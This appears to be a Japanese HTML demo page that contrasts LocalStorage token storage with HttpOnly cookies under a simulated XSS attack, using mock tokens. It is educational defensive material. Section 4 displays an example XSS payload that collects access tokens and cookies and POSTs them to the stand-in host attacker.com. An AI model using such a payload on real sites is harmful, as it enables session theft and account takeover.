<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS保護デモ - Charactier AI</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 2rem;
            background: #f9fafb;
        }
        .card {
            background: white;
            border-radius: 8px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        h1 {
            color: #1f2937;
            margin-bottom: 2rem;
        }
        h2 {
            color: #374151;
            margin-top: 0;
        }
        .alert {
            padding: 1rem;
            border-radius: 6px;
            margin: 1rem 0;
        }
        .alert-danger {
            background: #fee;
            border: 1px solid #fcc;
            color: #c00;
        }
        .alert-success {
            background: #efe;
            border: 1px solid #cfc;
            color: #060;
        }
        .alert-info {
            background: #e6f3ff;
            border: 1px solid #b3d9ff;
            color: #0066cc;
        }
        button {
            background: #7c3aed;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            margin-right: 0.5rem;
            margin-bottom: 0.5rem;
        }
        button:hover {
            background: #6d28d9;
        }
        button.danger {
            background: #dc2626;
        }
        button.danger:hover {
            background: #b91c1c;
        }
        pre {
            background: #f3f4f6;
            padding: 1rem;
            border-radius: 6px;
            overflow-x: auto;
            font-size: 0.875rem;
        }
        .result {
            margin-top: 1rem;
            padding: 1rem;
            background: #f9fafb;
            border-radius: 6px;
            border: 1px solid #e5e7eb;
        }
    </style>
</head>
<body>
    <h1>🛡️ XSS保護デモンストレーション</h1>

    <div class="alert alert-info">
        <strong>📌 このページについて:</strong><br>
        LocalStorage方式とHttpOnly Cookie方式のセキュリティの違いを実際に体験できます。
    </div>

    <div class="card">
        <h2>1. テスト用トークンの設定</h2>
        <p>まず、テスト用のトークンを設定します。</p>
        <button onclick="setupTokens()">トークンを設定</button>
        <button onclick="clearTokens()" class="danger">トークンをクリア</button>
        <div id="setup-result" class="result" style="display:none;"></div>
    </div>

    <div class="card">
        <h2>2. LocalStorage方式のテスト（従来方式）</h2>
        <p>XSS攻撃をシミュレートして、LocalStorageからトークンを取得します。</p>
        <button onclick="simulateXSSLocalStorage()">XSS攻撃をシミュレート</button>
        <div id="localstorage-result" class="result" style="display:none;"></div>
    </div>

    <div class="card">
        <h2>3. HttpOnly Cookie方式のテスト（新方式）</h2>
        <p>同じXSS攻撃を試みますが、HttpOnly Cookieは読み取れません。</p>
        <button onclick="simulateXSSCookie()">XSS攻撃をシミュレート</button>
        <div id="cookie-result" class="result" style="display:none;"></div>
    </div>

    <div class="card">
        <h2>4. 実際のXSSペイロード例</h2>
        <p>以下は実際のXSS攻撃で使用される可能性のあるコードです：</p>
        <pre><code>&lt;script&gt;
// トークンを盗む悪意のあるコード
(function() {
    const tokens = {
        localStorage: localStorage.getItem('accessToken'),
        sessionStorage: sessionStorage.getItem('accessToken'),
        cookies: document.cookie
    };
    
    // 攻撃者のサーバーに送信
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(tokens)
    });
})();
&lt;/script&gt;</code></pre>
    </div>

    <script>
        // モックトークン
        const mockToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJpYXQiOjE2OTUwMjQwMDAsImV4cCI6MTY5NTExMDQwMH0.mock_signature_for_demo';
        
        function setupTokens() {
            // LocalStorageにトークンを保存
            localStorage.setItem('accessToken', mockToken);
            localStorage.setItem('refreshToken', mockToken + '_refresh');
            
            // 通常のCookie（JavaScriptからアクセス可能）
            document.cookie = `normalToken=${mockToken}; path=/`;
            
            // HttpOnly Cookieはブラウザからは設定できない（サーバー側で設定）
            
            const result = document.getElementById('setup-result');
            result.style.display = 'block';
            result.innerHTML = `
                <div class="alert alert-success">
                    ✅ トークンを設定しました！
                </div>
                <strong>LocalStorage:</strong>
                <pre>accessToken: ${mockToken.substring(0, 30)}...
refreshToken: ${(mockToken + '_refresh').substring(0, 30)}...</pre>
                <strong>通常のCookie:</strong>
                <pre>normalToken: ${mockToken.substring(0, 30)}...</pre>
                <strong>HttpOnly Cookie:</strong>
                <pre>（サーバー側でのみ設定可能）</pre>
            `;
        }
        
        function clearTokens() {
            localStorage.removeItem('accessToken');
            localStorage.removeItem('refreshToken');
            document.cookie = 'normalToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
            
            const result = document.getElementById('setup-result');
            result.style.display = 'block';
            result.innerHTML = '<div class="alert alert-info">🗑️ すべてのトークンをクリアしました。</div>';
        }
        
        function simulateXSSLocalStorage() {
            // XSS攻撃シミュレーション
            const stolenData = {
                localStorage: {
                    accessToken: localStorage.getItem('accessToken'),
                    refreshToken: localStorage.getItem('refreshToken')
                },
                sessionStorage: {
                    accessToken: sessionStorage.getItem('accessToken')
                },
                allLocalStorageKeys: Object.keys(localStorage)
            };
            
            const result = document.getElementById('localstorage-result');
            result.style.display = 'block';
            
            if (stolenData.localStorage.accessToken) {
                result.innerHTML = `
                    <div class="alert alert-danger">
                        ⚠️ <strong>トークンが盗まれました！</strong>
                    </div>
                    <strong>盗まれたデータ:</strong>
                    <pre>${JSON.stringify(stolenData, null, 2)}</pre>
                    <p>攻撃者はこのトークンを使用して、ユーザーになりすますことができます。</p>
                `;
            } else {
                result.innerHTML = `
                    <div class="alert alert-info">
                        📝 LocalStorageにトークンが見つかりません。先に「トークンを設定」をクリックしてください。
                    </div>
                `;
            }
        }
        
        function simulateXSSCookie() {
            // Cookie取得を試みる
            const allCookies = document.cookie;
            const cookieObj = {};
            
            allCookies.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name) cookieObj[name] = value;
            });
            
            const result = document.getElementById('cookie-result');
            result.style.display = 'block';
            
            result.innerHTML = `
                <div class="alert alert-success">
                    ✅ <strong>HttpOnly Cookieは保護されています！</strong>
                </div>
                <strong>JavaScriptから見えるCookie:</strong>
                <pre>${JSON.stringify(cookieObj, null, 2)}</pre>
                <p><strong>注意:</strong> HttpOnly属性が設定されたCookie（userAccessToken、userRefreshTokenなど）は表示されません。</p>
                <div class="alert alert-info">
                    💡 HttpOnly Cookieはブラウザが自動的にリクエストに含めますが、JavaScriptからは読み取れません。
                </div>
            `;
        }
        
        // ページ読み込み時の状態を表示
        window.onload = function() {
            console.log('🔍 現在の認証情報:');
            console.log('LocalStorage:', localStorage.getItem('accessToken') ? '存在' : 'なし');
            console.log('Cookies:', document.cookie || 'なし');
        };
    </script>
</body>
</html>